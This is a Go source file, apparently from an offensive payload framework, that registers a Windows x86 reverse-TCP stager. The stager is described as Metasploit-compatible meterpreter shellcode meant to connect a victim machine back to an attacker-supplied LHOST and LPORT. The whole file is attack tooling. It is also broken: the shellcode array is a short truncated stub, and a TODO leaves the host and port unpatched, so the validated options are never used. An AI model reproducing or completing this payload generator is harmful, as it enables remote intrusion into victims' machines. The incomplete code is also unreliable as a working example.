// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2025 kdsmith18542

package stagers

import (
	"fmt"
	"net"
	"github.com/kdsmith18542/pwny/internal/payload"
)

type WindowsX86TCP struct{}

func (g *WindowsX86TCP) Generate(opts payload.PayloadOptions) ([]byte, error) {
	if opts.LHOST == "" || opts.LPORT == 0 {
		return nil, fmt.Errorf("LHOST and LPORT are required")
	}

	ip := net.ParseIP(opts.LHOST)
	if ip == nil {
		return nil, fmt.Errorf("invalid LHOST: %s", opts.LHOST)
	}

	// Metasploit-compatible windows/meterpreter/reverse_tcp stager stub
	shellcode := []byte{
		0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b,
		0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c,
		0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
	}

	// TODO: Patch IP and Port into shellcode
	
	return shellcode, nil
}

func init() {
	payload.GlobalRegistry.RegisterStager("windows/x86/tcp", &WindowsX86TCP{})
}
